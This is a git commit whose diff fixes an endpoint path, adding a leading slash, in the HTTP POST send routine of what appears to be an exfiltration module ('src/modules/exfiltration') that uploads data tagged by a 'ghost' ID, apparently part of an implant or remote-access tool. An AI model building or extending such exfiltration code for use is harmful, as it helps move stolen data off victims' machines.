ccfd0689a7945b45589db6752e4e911d06e91005
ENIX1701 <enix1701@gmail.com>
2026-03-15 13:56:44 +0100

    chore: dies

--- src/modules/exfiltration/HttpPost.cpp
+++ src/modules/exfiltration/HttpPost.cpp
@@ -3,6 +3,6 @@
 #include "network/Comms.hpp"
 
 bool HttpPostMethod::send(const std::string& type, const std::string& data) {
-    std::string endpoint = "api/v1/ghost/upload/" + Config::GetGhostId() + "/" + type;
+    std::string endpoint = "/api/v1/ghost/upload/" + Config::GetGhostId() + "/" + type;
     return Comms::UploadFile(endpoint, type, data);
 }
